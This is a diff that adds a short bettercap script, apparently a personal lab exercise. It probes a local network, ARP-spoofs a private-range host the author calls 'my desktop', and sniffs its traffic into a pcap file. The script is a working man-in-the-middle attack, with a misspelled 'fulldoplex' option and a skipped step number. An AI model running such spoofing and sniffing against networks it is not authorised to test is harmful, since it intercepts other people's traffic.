@@ -1,0 +1,17 @@
+#step 1 : discovering devices on the network
+net.probe on
+set net.sniff.verbose false
+
+
+#step 2: setting target to my desktop
+set arp.spoof targets 192.168.56.1
+set arp.spoof.fulldoplex true
+
+
+#step 4: Start the sniffing
+#We log to a mcap file because its what the professionals do
+set net.sniff.output network_capture.pcap
+set net.sniff.local true
+
+arp.spoof on
+net.sniff on
